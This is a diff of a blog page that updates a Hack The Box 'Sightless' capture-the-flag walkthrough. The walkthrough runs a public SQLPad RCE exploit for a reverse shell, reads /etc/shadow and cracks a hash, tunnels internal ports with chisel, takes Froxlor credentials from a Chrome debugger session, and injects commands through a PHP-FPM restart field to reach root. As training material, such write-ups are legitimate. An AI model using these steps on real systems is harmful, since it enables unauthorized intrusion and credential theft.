@@ -11,7 +11,7 @@
   <title>Sightless Walkthrough(Hack The Box) &middot; Secure The Throne</title>
   <meta name="title" content="Sightless Walkthrough(Hack The Box) &middot; Secure The Throne" />
   
-  <meta name="description" content="a description" />
+  <meta name="description" content="A short Walkthrough for the box Sightless" />
   <meta name="keywords" content="Easy, Linux, Hack The Box, Hacking, Web, Walkthrough, " />
   
   
@@ -72,12 +72,12 @@
   <meta property="og:url" content="http://localhost:1313/posts/1742496891311-sightless-walkthroughhtb/">
   <meta property="og:site_name" content="Secure The Throne">
   <meta property="og:title" content="Sightless Walkthrough(Hack The Box)">
-  <meta property="og:description" content="a description">
+  <meta property="og:description" content="A short Walkthrough for the box Sightless">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2025-03-20T00:00:00+00:00">
-    <meta property="article:modified_time" content="2025-03-20T00:00:00+00:00">
+    <meta property="article:published_time" content="2025-04-03T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-04-03T00:00:00+00:00">
     <meta property="article:tag" content="Easy">
     <meta property="article:tag" content="Linux">
     <meta property="article:tag" content="Hack the Box">
@@ -90,7 +90,7 @@
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:image" content="http://localhost:1313/posts/1742496891311-sightless-walkthroughhtb/featured.png">
   <meta name="twitter:title" content="Sightless Walkthrough(Hack The Box)">
-  <meta name="twitter:description" content="a description">
+  <meta name="twitter:description" content="A short Walkthrough for the box Sightless">
 
   
   <script type="application/ld+json">
@@ -100,7 +100,7 @@
     "articleSection": "Posts",
     "name": "Sightless Walkthrough(Hack The Box)",
     "headline": "Sightless Walkthrough(Hack The Box)",
-    "description": "a description",
+    "description": "A short Walkthrough for the box Sightless",
     
     "inLanguage": "en",
     "url" : "http:\/\/localhost:1313\/posts\/1742496891311-sightless-walkthroughhtb\/",
@@ -109,15 +109,15 @@
       "name": "Emp5r0R"
     },
     "copyrightYear": "2025",
-    "dateCreated": "2025-03-20T00:00:00\u002b00:00",
-    "datePublished": "2025-03-20T00:00:00\u002b00:00",
+    "dateCreated": "2025-04-03T00:00:00\u002b00:00",
+    "datePublished": "2025-04-03T00:00:00\u002b00:00",
     
-    "dateModified": "2025-03-20T00:00:00\u002b00:00",
+    "dateModified": "2025-04-03T00:00:00\u002b00:00",
     
     "keywords": ["Easy","Linux","Hack The Box","Hacking","Web","Walkthrough"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "435"
+    "wordCount": "515"
   }]
   </script>
 
@@ -155,6 +155,9 @@
 
 
 
+
+
+<script defer src="/lib/typeit/typeit.umd.57f9bc6e047efc875cb4f2e9ca74c802de33638d2c3aff6d9b7eb3c7588c24649b6c3e51cd45f49c0ed0cf72aedbd694bf2d35f358a34076d63f9febabc0bd6f.js" integrity="sha512-V/m8bgR&#43;/IdctPLpynTIAt4zY40sOv9tm36zx1iMJGSbbD5RzUX0nA7Qz3Ku29aUvy0181ijQHbWP5/rq8C9bw=="></script>
 
 
 
@@ -678,7 +681,7 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2025-03-20T00:00:00&#43;00:00">20 March 2025</time><span class="px-2 text-primary-500">&middot;</span><span>435 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">3 mins</span><span class="px-2 text-primary-500">&middot;</span>
+  <time datetime="2025-04-03T00:00:00&#43;00:00">3 April 2025</time><span class="px-2 text-primary-500">&middot;</span><span>515 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">3 mins</span><span class="px-2 text-primary-500">&middot;</span>
 
 
 <script type="text/javascript" src="/js/zen-mode.min.eea5245cf9244ecbdf2c150d1c8833226c1541cadf6e98f63a7c9192b1a3676df2c3ec603b14f4cfaaa53971fd9d8955640c0f405bf3de2b43ee7a5fb29ae721.js" integrity="sha512-7qUkXPkkTsvfLBUNHIgzImwVQcrfbpj2OnyRkrGjZ23yw&#43;xgOxT0z6qlOXH9nYlVZAwPQFvz3itD7npfsprnIQ=="></script>
@@ -945,8 +948,7 @@
     class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#reconnaissance-linux">Reconnaissance #Linux</a></li>
-    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#reconnaissance--enumeration">Reconnaissance &amp; Enumeration</a></li>
     <li><a href="#exploitation">Exploitation</a></li>
     <li><a href="#privilege-escalation">Privilege Escalation</a></li>
   </ul>
@@ -962,8 +964,7 @@
     class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#reconnaissance-linux">Reconnaissance #Linux</a></li>
-    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#reconnaissance--enumeration">Reconnaissance &amp; Enumeration</a></li>
     <li><a href="#exploitation">Exploitation</a></li>
     <li><a href="#privilege-escalation">Privilege Escalation</a></li>
   </ul>
@@ -1049,39 +1050,42 @@
         <div class="article-content max-w-prose mb-20">
           
 
-<h2 class="relative group">Reconnaissance #Linux 
-    <div id="reconnaissance-linux" class="anchor"></div>
+<h2 class="relative group">Reconnaissance &amp; Enumeration 
+    <div id="reconnaissance--enumeration" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#reconnaissance-linux" aria-label="Anchor">#</a>
+            style="text-decoration-line: none !important;" href="#reconnaissance--enumeration" aria-label="Anchor">#</a>
     </span>        
     
 </h2>
 <ul>
-<li>Got three ports open</li>
-<li>![[Pasted image 20241221001932.png]]</li>
-<li>FTP, SSH, web server</li>
-<li>The page running on <code>nginx/1.18.0</code></li>
-</ul>
+<li>Network scan reveals three open ports
 
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221001932.png?raw=true" alt="Pasted image 20241221001932.png" />
+    
+  </figure>
+</li>
+<li>Which are <code>FTP</code>, <code>SSH</code>, <code>http(80)</code>. Port <code>21(FTP)</code> is very unusual here.
 
-<h2 class="relative group">Enumeration 
-    <div id="enumeration" class="anchor"></div>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://media1.tenor.com/m/zZvOQkS9VysAAAAC/it%E2%80%99s-nice-it%E2%80%99s-different.gif" alt="three" />
     
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#enumeration" aria-label="Anchor">#</a>
-    </span>        
-    
-</h2>
-<ul>
-<li>The web had a Slightless Titled page while scrolling through I found a link button which redirected to <code>sqlpad.sightless.htb</code> website.</li>
-<li>I quickly added it hosts and visited it.</li>
-<li>Found  RCE from google in single search : <a href="https://github.com/shhrew/CVE-2022-0944.git" target="_blank">https://github.com/shhrew/CVE-2022-0944.git</a></li>
+  </figure>
+</li>
+<li>Initial Enumeration reveals that the page uses <code>nginx/1.18.0</code></li>
+<li>Port <code>80</code> had a Slightless Titled page, while scrolling through I found a button which redirected to <code>sqlpad.sightless.htb</code>. It&rsquo;s a different domain so I quickly added it to my hosts file and visited it.</li>
+<li>Found a RCE vulnerability from google search: <a href="https://github.com/shhrew/CVE-2022-0944.git" target="_blank">POC</a></li>
 </ul>
+<p><span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+     CVE-2022-0944 
+  </span>
+</span>
+
+Template injection in connection test endpoint leads to RCE in GitHub repository sqlpad/sqlpad prior to 6.10.1.</p>
 
 
 <h2 class="relative group">Exploitation 
@@ -1095,25 +1099,65 @@
     
 </h2>
 <ul>
-<li>By executing it got shell</li>
+<li>First I cloned this <a href="https://github.com/shhrew/CVE-2022-0944" target="_blank">repo</a> and then I installed all required packages.</li>
 </ul>
-<pre tabindex="0"><code>python3 main.py http://sqlpad.sightless.htb/ 10.10.14.12 6001
-</code></pre><ul>
-<li>There was a sqlite file in the current working  directory but there isn&rsquo;t any way to transfer it to our machine cause no versions of python installed</li>
-<li>Then I got to know that this is a docker image that we are in</li>
-<li>![[Pasted image 20241221022335.png]]</li>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pip3 install -r requirements.txt
+</span></span></code></pre></div><ul>
+<li>Then I execurted the POC and eventually got the shell</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 main.py http://sqlpad.sightless.htb/ 10.10.14.12 <span class="m">6001</span>
+</span></span></code></pre></div><ul>
+<li>There was a sqlite file in the current working directory but, there wasn&rsquo;t any way to transfer it to our machine cause no versions of python found om the system.</li>
+<li>Then I got to know that this is a docker image.
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221022335.png?raw=true" alt="Pasted image 20241221022335.png" />
+    
+  </figure>
+</li>
 <li>Cause it is weird to have this directory here.</li>
-<li>Anyway from <code>/etc/passwd</code>got know that there are two users</li>
-<li>![[Pasted image 20241221022519.png]]</li>
-<li>From shadow I got the hash of user michael for cracking. Ignore the root hash i am pretty sure it will waste our time.</li>
-<li>![[Pasted image 20241221022725.png]]</li>
-<li>After finding the module cracked it with my goto tool</li>
+<li>Anyway from <code>/etc/passwd</code> I got know about the two users with bash permissions
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221022519.png?raw=true" alt="Pasted image 20241221022519.png" />
+    
+  </figure>
+</li>
+<li>From shadow I got the hash of user michael for cracking. Ignore the root hash i am pretty sure it would be a waste of time.
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221022725.png?raw=true" alt="Pasted image 20241221022725.png" />
+    
+  </figure>
+</li>
+<li>After finding the module, I cracked it with my goto tool</li>
 </ul>
-<pre tabindex="0"><code> hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
-</code></pre><ul>
-<li>then logged in via SSH</li>
-<li>Got user flag</li>
-<li>![[Pasted image 20241221023004.png]]</li>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> hashcat -m <span class="m">1800</span> hash.txt /usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><ul>
+<li>then I logged in via SSH</li>
+<li>Got 
+<div class="flex mt-2">
+<span
+  class="rounded-full bg-primary-500 dark:bg-primary-400 text-neutral-50 dark:text-neutral-800 px-1.5 py-[1px] text-xs font-normal"
+>
+  <span class="flex flex-row items-center">
+    
+    <span>User flag</span>
+  </span>
+</span>
+</div>
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221023004.png?raw=true" alt="Pasted image 20241221023004.png" />
+    
+  </figure>
+
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://media1.tenor.com/m/Ej4XZ8-ThvMAAAAC/positive-bear.gif" alt="so-far-so-good" />
+    
+  </figure>
+</li>
 </ul>
 
 
@@ -1128,37 +1172,111 @@
     
 </h2>
 <ul>
-<li>Done some enumeration but <code>ss -tunlp</code> looked sus</li>
-<li>Too many ports don&rsquo;t ya think</li>
-<li>![[Pasted image 20241221023121.png]]</li>
+<li>While doing post-enumeration I found some interesting local ports using <code>ss -tunlp</code></li>
+<li>Too many ports don&rsquo;t ya think. Kinda sus if you ask me
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221023121.png?raw=true" alt="Pasted image 20241221023121.png" />
+    
+  </figure>
+
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://media1.tenor.com/m/RNVIdsfRXz0AAAAd/hamstermert.gif" alt="sus" />
+    
+  </figure>
+</li>
 <li>So I decided to forward all the weird looking ports to my machine</li>
 <li>On my machine</li>
 </ul>
-<pre tabindex="0"><code>chisel server -p 7001 --reverse
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">chisel server -p <span class="m">7001</span> --reverse
+</span></span></code></pre></div><ul>
 <li>On the target machine</li>
 </ul>
-<pre tabindex="0"><code>./chisel client 10.10.14.12:7001 R:3306:localhost:3306 R:44771:localhost:44771 R:8080:localhost:8080 R:43047:localhost:43047 R:41049:localhost:41049 R:3000:localhost:3000 R:33060:localhost:33060
-</code></pre><ul>
-<li>It seems that port 8080 is running Froxlor, which required credentials to login</li>
-<li>All the remaining ports seems to suspicious cause most are non-http ones</li>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./chisel client 10.10.14.12:7001 R:3306:localhost:3306 R:44771:localhost:44771 R:8080:localhost:8080 R:43047:localhost:43047 R:41049:localhost:41049 R:3000:localhost:3000 R:33060:localhost:33060
+</span></span></code></pre></div><ul>
+<li>Not gonna lie that&rsquo;s a lot of ports</li>
+<li>It seems that port <code>8080</code> is running <code>Froxlor</code>, which required credentials to login
+
+<details>
+  <summary>What is Froxlor</summary>
+  <p>The server administration software for your needs. Developed by experienced server administrators, this panel simplifies the effort of managing your hosting platform.</p>
+</details>
+</li>
+<li>All the remaining ports seems to be suspicious cause most are non-http ones</li>
 <li>Some of the ports are using chrome debugger internally to do some tasks.</li>
-<li>So I opened chrome and navigated to here chrome://inspect/#devices and added all the ports using configure.</li>
-<li>![[Pasted image 20241221023839.png]]</li>
-<li>Got some hits. I clicked inspect and saw it automatically logging into Froxlor with credentials often</li>
-<li>From the Network tab, got auth request and got the password and username.</li>
-<li>![[Pasted image 20241221024137.png]]</li>
+<li>So I opened chrome and navigated to <code>chrome://inspect/#devices</code> and added all the forwarded ports using configure.
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221023839.png?raw=true" alt="Pasted image 20241221023839.png" />
+    
+  </figure>
+</li>
+<li>Got some hits. I clicked inspect and saw it automatically logging into Froxlor with credentials.</li>
+<li>From the Network tab, I auth request I saw the credentials in plaintext.
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221024137.png?raw=true" alt="Pasted image 20241221024137.png" />
+    
+  </figure>
+</li>
 <li>Used those creds and got into Froxlor</li>
-<li>While hanging around there discovered a interesting endpoint that could lead to command injection</li>
-<li>![[Pasted image 20241221024348.png]]</li>
+<li>While hanging around, I discovered an potential endpoint that could lead to command injection
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221024348.png?raw=true" alt="Pasted image 20241221024348.png" />
+    
+  </figure>
+</li>
 <li>Created a New PHP version from PHP-FPM versions</li>
-<li>In the php-fpm restart command filled with <code>cp /root/root.txt /home</code></li>
+<li>In the php-fpm restart command I filled it with <code>cp /root/root.txt /home</code></li>
 <li>Then went to settings and then restarted the php-fpm</li>
-<li>After 3-5 min I got the file in the home directory but we need permissions so again using the same method modified the command to <code>chmod 777 /home/root.txt</code></li>
-<li>![[Pasted image 20241221024823.png]]</li>
-<li>Got the user flag. Then realized from the start I should&rsquo;ve changed permissions for root directory itself</li>
-<li>![[Pasted image 20241221024851.png]]</li>
+<li>After 3-5 min I got the file in the home directory but we need permissions so again using the same method I modified the command to <code>chmod 777 /home/root.txt</code> This will change permissions.
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221024823.png?raw=true" alt="Pasted image 20241221024823.png" />
+    
+  </figure>
+</li>
+<li>Got the 
+<div class="flex mt-2">
+<span
+  class="rounded-full bg-primary-500 dark:bg-primary-400 text-neutral-50 dark:text-neutral-800 px-1.5 py-[1px] text-xs font-normal"
+>
+  <span class="flex flex-row items-center">
+    
+    <span>User flag</span>
+  </span>
+</span>
+</div> Then I realized that from the start I should&rsquo;ve changed permissions for root directory itself
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221024851.png?raw=true" alt="Pasted image 20241221024851.png" />
+    
+  </figure>
+</li>
 </ul>
+<div id="typeit-2c30664922b76feb6bc01781d60811d6"></div>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+      new TypeIt("#typeit-2c30664922b76feb6bc01781d60811d6", {
+        strings: [" I hope you liked my walkthrough if you do please share it with your connections. That's it see you later "],
+        speed:  100 ,
+        lifeLike:  false ,
+        startDelay:  0 ,
+        breakLines:  true ,
+        waitUntilVisible:  true ,
+        loop:  false 
+      }).go();
+    });
+</script>
+<p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://media1.tenor.com/m/DF0rzVHsu14AAAAC/xranz45-xranz54.gif" alt="see-ya" />
+    
+  </figure>
+</p>
 
           
           
@@ -1481,6 +1599,172 @@
   
   
 
+  <a href="/posts/1742404292339-greenhorn-walkthroughhtb/" class="min-w-full">
+    
+    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
+        
+        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/1742404292339-greenhorn-walkthroughhtb/featured_hu_ca5f1c2508c29c51.png);"></div>
+        
+      
+
+      <div class="px-6 py-4">
+
+        
+        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/posts/1742404292339-greenhorn-walkthroughhtb/">Greenhorn Walkthrough(Hack The Box)</div>
+        
+
+        <div class="text-sm text-neutral-500 dark:text-neutral-400">
+          
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2025-03-26T00:00:00&#43;00:00">26 March 2025</time><span class="px-2 text-primary-500">&middot;</span><span>1013 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">5 mins</span>
+  
+
+  
+  
+</div>
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+</div>
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/easy/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Easy
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/linux/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Linux
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/hack-the-box/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Hack the Box
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/hacking/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Hacking
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/web/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Web
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/walkthrough/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Walkthrough
+  </span>
+</span>
+  </span>
+  
+  
+  
+  
+</div>
+
+
+
+
+        </div>
+
+        
+        <div class="py-1 prose dark:prose-invert">
+          
+        </div>
+        
+      </div>
+      <div class="px-6 pt-4 pb-2">
+
+      </div>
+    </div>
+  </a>
+
+  
+  
+
   <a href="/posts/1742495331851-travel-walkthroughhtb/" class="min-w-full">
     
     <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
@@ -1536,7 +1820,7 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2025-03-23T00:00:00&#43;00:00">23 March 2025</time><span class="px-2 text-primary-500">&middot;</span><span>3417 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">17 mins</span>
+  <time datetime="2025-03-28T00:00:00&#43;00:00">28 March 2025</time><span class="px-2 text-primary-500">&middot;</span><span>3416 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">17 mins</span>
   
 
   
@@ -1645,172 +1929,6 @@
   </a>
 
   
-  
-
-  <a href="/posts/1741895312886-support-walkthroughhtb/" class="min-w-full">
-    
-    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
-        
-        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/1741895312886-support-walkthroughhtb/featured_hu_9ba6bcbcfa138ba8.jpeg);"></div>
-        
-      
-
-      <div class="px-6 py-4">
-
-        
-        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
-          href="/posts/1741895312886-support-walkthroughhtb/">Support Walkthrough(Hack The Box)</div>
-        
-
-        <div class="text-sm text-neutral-500 dark:text-neutral-400">
-          
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-<div class="flex flex-row flex-wrap items-center">
-  
-  
-  <time datetime="2025-03-18T00:00:00&#43;00:00">18 March 2025</time><span class="px-2 text-primary-500">&middot;</span><span>1064 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">5 mins</span>
-  
-
-  
-  
-</div>
-
-
-<div class="flex flex-row flex-wrap items-center">
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-</div>
-
-
-
-
-<div class="flex flex-row flex-wrap items-center">
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/easy/&#34;,'_self');return false;">
-    <span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Easy
-  </span>
-</span>
-  </span>
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/windows/&#34;,'_self');return false;">
-    <span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Windows
-  </span>
-</span>
-  </span>
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/hack-the-box/&#34;,'_self');return false;">
-    <span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Hack the Box
-  </span>
-</span>
-  </span>
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/hacking/&#34;,'_self');return false;">
-    <span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Hacking
-  </span>
-</span>
-  </span>
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/active-directory/&#34;,'_self');return false;">
-    <span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Active Directory
-  </span>
-</span>
-  </span>
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/walkthrough/&#34;,'_self');return false;">
-    <span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Walkthrough
-  </span>
-</span>
-  </span>
-  
-  
-  
-  
-</div>
-
-
-
-
-        </div>
-
-        
-        <div class="py-1 prose dark:prose-invert">
-          
-        </div>
-        
-      </div>
-      <div class="px-6 pt-4 pb-2">
-
-      </div>
-    </div>
-  </a>
-
-  
 </section>
 
   
@@ -1845,7 +1963,7 @@
       <div class="flex justify-between pt-3">
         <span>
           
-            <a class="flex group mr-3" href="/posts/1741895312886-support-walkthroughhtb/">
+            <a class="flex group mr-3" href="/posts/1742496721950-access-walkthroughhtb/">
               <span
                 class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                 >&larr;</span
@@ -1857,11 +1975,11 @@
               <span class="flex flex-col">
                 <span
                   class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >Support Walkthrough(Hack The Box)</span
+                  >Access Walkthrough(Hack The Box)</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
-                    <time datetime="2025-03-18T00:00:00&#43;00:00">18 March 2025</time>
+                    <time datetime="2025-04-01T00:00:00&#43;00:00">1 April 2025</time>
                   
                 </span>
               </span>
@@ -1869,28 +1987,6 @@
           
         </span>
         <span>
-          
-            <a class="flex text-right group ml-3" href="/posts/1742061149402-jarmis-walkthroughhtb/">
-              <span class="flex flex-col">
-                <span
-                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >Jarmis Walkthrough(Hack The Box)</span
-                >
-                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
-                  
-                    <time datetime="2025-03-20T00:00:00&#43;00:00">20 March 2025</time>
-                  
-                </span>
-              </span>
-              <span
-                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
-                >&rarr;</span
-              >
-              <span
-                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
-                >&larr;</span
-              >
-            </a>
           
         </span>
       </div>
@@ -1915,6 +2011,14 @@
     
     <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
       <ul class="flex flex-col list-none sm:flex-row">
+        
+        <li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
+          <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href="/attribution-and-terms-of-use/"
+            title="Attribution &amp; Terms of Use">
+            
+            Attribution &amp; Terms of Use
+          </a>
+        </li>
         
         <li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
           <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href=""
